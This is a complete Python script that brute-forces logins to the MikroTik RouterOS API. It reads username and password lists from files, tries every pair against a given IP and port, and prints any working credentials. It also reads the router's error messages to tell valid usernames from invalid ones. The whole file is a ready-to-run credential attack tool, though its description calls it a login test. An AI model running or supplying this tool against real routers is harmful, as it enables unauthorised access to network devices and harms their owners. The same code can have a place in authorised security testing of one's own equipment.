import sys
import argparse
from librouteros import connect
from librouteros.exceptions import TrapError

def load_list(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

def test_login(ip, port, usernames, passwords):
    for user in usernames:
        user_match = False
        for password in passwords:
            try:
                connect(username=user, password=password, host=ip, port=port)
                print(f"Login successful: {user}/{password}")
                return
            except TrapError as e:
                if not user_match:
                    try:
                        connect(username=user, password="wrong_password", host=ip, port=port)
                    except TrapError:
                        user_match = True
                if "invalid user" in str(e).lower():
                    print(f"Invalid user: {user}")
                elif "invalid password" in str(e).lower():
                    print(f"Invalid password: {password}")
            except Exception as e:
                if "Connection refused" in str(e):
                    print(f"Error: {e}")
                    return

    for password in passwords:
        try:
            connect(username="wrong_username", password=password, host=ip, port=port)
        except TrapError as e:
            if "invalid password" in str(e).lower():
                print(f"Password match: {password}")
                return
            else:
                print(f"Error: {e}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Test MikroTik login')
    parser.add_argument('--h', required=True, help='IP address of MikroTik')
    parser.add_argument('--p', default=8728, type=int, help='Port of MikroTik API')
    parser.add_argument('--u', required=True, help='File containing usernames')
    parser.add_argument('--pw', required=True, help='File containing passwords')

    args = parser.parse_args()

    ip_address = args.h
    port = args.p
    username_file = args.u
    password_file = args.pw

    usernames = load_list(username_file)
    passwords = load_list(password_file)

    test_login(ip_address, port, usernames, passwords)